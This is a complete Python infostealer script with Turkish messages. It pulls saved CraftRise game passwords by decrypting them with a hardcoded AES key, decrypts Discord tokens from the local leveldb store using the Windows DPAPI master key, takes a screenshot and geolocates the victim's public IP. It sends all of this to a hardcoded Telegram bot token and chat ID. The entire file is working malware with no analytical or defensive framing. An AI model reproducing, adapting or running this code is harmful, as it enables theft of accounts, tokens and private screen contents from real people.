import os
import json
import base64
import requests
import win32crypt
import re
from Crypto.Cipher import AES
import mss
import tempfile
import random
import time

BOT_TOKEN = '8225933065:AAEtGqTIkeEqmiIsgGnSImPRtr-kwqRzXqM'
CHAT_ID = '6918218452'
SEND_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

class Stealer:
    def __init__(self):
        self.user = os.getenv('USERPROFILE')
        self.craftrise_accounts = []
        self.discord_path = os.path.join(self.user, 'AppData', 'Roaming', 'Discord')

    def start_steal(self):
        for root, dirs, files in os.walk(os.path.join(self.user, 'AppData', 'Roaming', '.craftrise')):
            for file in files:
                if file == 'config.json':
                    config_file = os.path.join(root, file)
                    self.process_craftrise_config(config_file)
        if self.craftrise_accounts:
            content = self.format_craftrise_data()
            self.send_to_telegram(content)
        discord_tokens = self.collect_discord_tokens()
        if discord_tokens:
            content = self.format_discord_tokens(discord_tokens)
            self.send_to_telegram(content)
        screenshot_path = self.capture_screenshot()
        if screenshot_path:
            self.send_screenshot(screenshot_path)
        self.get_public_ip_info()

    def get_public_ip_info(self):
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
            ip_location = self.get_ip_location(public_ip)
            info = {
                'PublicIP': public_ip,
                'PublicIPLocation': ip_location
            }
            content = f"İp Çekme Başarılı✅: {info['PublicIP']}\nLokasyon Çekme Başarılı 📍: {info['PublicIPLocation']}"
            self.send_to_telegram(content)
        except:
            pass

    def get_ip_location(self, ip):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                location = f"{data.get('city', 'Unknown')}, {data.get('regionName', 'Unknown')}, {data.get('country', 'Unknown')}"
                return location
        except:
            pass
        return "Unknown"

    def process_craftrise_config(self, config_file):
        with open(config_file, 'r', encoding='utf-8') as file:
            data = json.load(file)
            username = data.get('rememberName', 'empty')
            encrypted_password = data.get('rememberPass', 'empty')
            password = self.decrypt_craftrise_password(encrypted_password)
            if username != 'empty' and password != 'empty':
                self.craftrise_accounts.append({'username': username, 'password': password})

    def decrypt_craftrise_password(self, encrypted_password):
        key = '2640023187059250'.encode('utf-8')
        cipher = AES.new(key, AES.MODE_ECB)
        encrypted_data = base64.b64decode(encrypted_password)
        decrypted_data = cipher.decrypt(encrypted_data)
        if len(decrypted_data) > 0:
            padding_length = decrypted_data[-1]
            decrypted_text = decrypted_data[:-padding_length].decode('utf-8')
            decrypted_text = self.process_rise_version(decrypted_text)
            return decrypted_text.split('#')[0]
        return 'empty'

    def process_rise_version(self, input_str):
        def decrypt_and_clean(s):
            s = self.decode_base64(s)
            if not s:
                return ''
            return s.replace('3ebi2mclmAM7Ao2', '').replace('KweGTngiZOOj9d6', '')
        decoded_str = decrypt_and_clean(input_str)
        decoded_str = decrypt_and_clean(decoded_str)
        decoded_str = self.decode_base64(decoded_str)
        return decoded_str or ''

    def decode_base64(self, input_str):
        try:
            return base64.b64decode(input_str).decode('utf-8')
        except:
            return

    def format_craftrise_data(self):
        result = ''
        for account in self.craftrise_accounts:
            result += f"👤 Nick : <code>{account['username']}</code>\n🟢 Şifre : <code>{account['password']}</code>\n\n"
        return result

    def decrypt_discord_token(self, encrypted_token, master_key):
        try:
            decrypted_master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            encrypted_value = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:(-16)]
            tag = encrypted_value[(-16):]
            cipher = AES.new(decrypted_master_key, AES.MODE_GCM, iv)
            decrypted_token = cipher.decrypt_and_verify(payload, tag).decode()
            return decrypted_token
        except Exception:
            return None

    def collect_discord_tokens(self):
        tokens = []
        local_state_path = os.path.join(self.discord_path, 'Local State')
        leveldb_path = os.path.join(self.discord_path, 'Local Storage', 'leveldb')
        if not os.path.exists(leveldb_path):
            return []
        with open(local_state_path, 'r', encoding='utf-8') as f:
            encrypted_key = json.load(f)['os_crypt']['encrypted_key']
            master_key = base64.b64decode(encrypted_key)[5:]
        for file_name in os.listdir(leveldb_path):
            if file_name.endswith('.ldb') or file_name.endswith('.log'):
                file_path = os.path.join(leveldb_path, file_name)
                with open(file_path, 'r', errors='ignore') as f:
                    for line in f:
                        for match in re.findall('dQw4w9WgXcQ:[^\\\"]+', line):
                            tokens.append(match)
        unique_tokens = list(set(tokens))
        decrypted_tokens = []
        for token in unique_tokens:
            decrypted = self.decrypt_discord_token(token, master_key)
            if not decrypted:
                continue
            decrypted_tokens.append(decrypted)
        return decrypted_tokens

    def format_discord_tokens(self, tokens):
        result = ''
        for token in tokens:
            result += f"📝Discord Token📝: <code>{token}</code>\n\n"
        return result

    def send_to_telegram(self, message):
        data = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        try:
            response = requests.post(SEND_URL, json=data)
            if response.status_code != 200:
                print(f"Hata oluştu: {response.status_code}")
        except Exception as e:
            print(f"Hata oluştu: {str(e)}")

    def capture_screenshot(self):
        try:
            with mss.mss() as sct:
                tmp_dir = tempfile.gettempdir()
                timestamp = int(time.time())
                filename = f"screenshot_{timestamp}_{random.randint(1000, 9999)}.png"
                filepath = os.path.join(tmp_dir, filename)
                sct.shot(output=filepath)
                return filepath
        except Exception:
            return None

    def send_screenshot(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                files = {'photo': (os.path.basename(filepath), f, 'image/png')}
                response = requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    data={'chat_id': CHAT_ID},
                    files=files
                )
                if response.status_code != 200:
                    print(f"Hata oluştu: {response.status_code}")
        except Exception as e:
            print(f"Hata oluştu: {str(e)}")
        finally:
            if filepath and os.path.exists(filepath):
                os.remove(filepath)

if __name__ == "__main__":
    stealer = Stealer()
    stealer.start_steal()
